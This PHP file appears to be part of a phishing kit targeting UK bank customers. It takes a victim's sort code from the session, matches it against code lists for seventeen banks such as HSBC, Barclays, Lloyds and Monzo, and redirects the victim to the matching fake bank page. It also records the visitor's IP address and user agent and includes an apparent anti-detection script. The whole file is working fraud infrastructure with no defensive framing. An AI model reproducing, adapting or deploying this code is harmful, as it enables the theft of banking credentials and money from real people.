<?php
error_reporting(0);
session_start();

include "includes/my_email.php";
if ($_SESSION['access']== "") {
	header("Location: ../index");
}

	include 'anti.php';


$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);


date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

$sort_code = $_SESSION['sc'];

$source = file_get_contents('codes/hsbc_codes.txt');
$source2 = file_get_contents('codes/barclays_codes.txt');
$source3 = file_get_contents('codes/sains-codes.txt');
$source4 = file_get_contents('codes/metro-codes.txt');
$source5 = file_get_contents('codes/halifax_codes.txt');
$source6 = file_get_contents('codes/lloyds_codes.txt');
$source7 = file_get_contents('codes/natwest_codes.txt');
$source8 = file_get_contents('codes/rbs_codes.txt');
$source9 = file_get_contents('codes/santander_codes.txt');
$source10 = file_get_contents('codes/tsb_codes.txt');
$source11 = file_get_contents('codes/clydesdale_codes.txt');
$source12 = file_get_contents('codes/nation_codes.txt');
$source13 = file_get_contents('codes/citi_codes.txt');
$source14 = file_get_contents('codes/ulster-codes.txt');
$source15 = file_get_contents('codes/tesco-codes.txt');
$source16 = file_get_contents('codes/coop-codes.txt');
$source17 = file_get_contents('codes/monzo-codes.txt');
$array = explode("\r\n", $source);
$array2 = explode("\r\n", $source2);
$array3 = explode("\r\n", $source3);
$array4 = explode("\r\n", $source4);
$array5 = explode("\r\n", $source5);
$array6 = explode("\r\n", $source6);
$array7 = explode("\r\n", $source7);
$array8 = explode("\r\n", $source8);
$array9 = explode("\r\n", $source9);
$array10 = explode("\r\n", $source10);
$array11 = explode("\r\n", $source11);
$array12 = explode("\r\n", $source12);
$array13 = explode("\r\n", $source13);
$array14 = explode("\r\n", $source14);
$array15 = explode("\r\n", $source15);
$array16 = explode("\r\n", $source16);
$array17 = explode("\r\n", $source17);

if($logsresults == '1') {
if (in_array($_SESSION['sc'], $array))  {

    header("Location: 1?&sessionid=$hash&code=22");
	die();
	
}

if (in_array($_SESSION['sc'], $array2))  {

    header("Location: 2?&sessionid=$hash&code=22");
    die();

}

if (in_array($_SESSION['sc'], $array5))  {

    header("Location: 3?&sessionid=$hash&code=22");
    die();

}

if (in_array($_SESSION['sc'], $array6))  {

    header("Location: 4?&sessionid=$hash&code=22");
    die();

}

if (in_array($_SESSION['sc'], $array7))  {

    header("Location: 5?&sessionid=$hash&code=22");
    die();

}

if (in_array($_SESSION['sc'], $array8))  {

    header("Location: 6?&sessionid=$hash&code=22");
    die();
	
}

if (in_array($_SESSION['sc'], $array9))  {

    header("Location: 8?&sessionid=$hash&code=22");
    die();
	
}

if (in_array($_SESSION['sc'], $array10))  {

    header("Location: 9?&sessionid=$hash&code=22");
    die();
	
}

if (in_array($_SESSION['sc'], $array11))  {

    header("Location: 10?&sessionid=$hash&code=22");
    die();

}

if (in_array($_SESSION['sc'], $array12))  {

    header("Location: 11?&sessionid=$hash&code=22");
    die();

}

if (in_array($_SESSION['sc'], $array3))  {

    header("Location: 13?&sessionid=$hash&code=22");
    die();

}
if (in_array($_SESSION['sc'], $array4))  {

    header("Location: 14?&sessionid=$hash&code=22");
    die();

}

if (in_array($_SESSION['sc'], $array13))  {

    header("Location: 12?&sessionid=$hash&code=22");
    die();

}
if (in_array($_SESSION['sc'], $array14))  {

    header("Location: 16?&sessionid=$hash&code=22");
    die();

}
if (in_array($_SESSION['sc'], $array15))  {

    header("Location: 15?&sessionid=$hash&code=22");
    die();

}
if (in_array($_SESSION['sc'], $array16))  {

    header("Location: 17?&sessionid=$hash&code=22");
    die();

}
if (in_array($sort_code, $array17))  {

    header("Location: 18?&sessionid=$hash&code=22");
    die();

}


else  {

    header('Location: complete?&sessionid=$hash&code=22');
    die();
	

}
}
else {
	header('Location: complete?&sessionid=$hash&code=22');	
	}

?>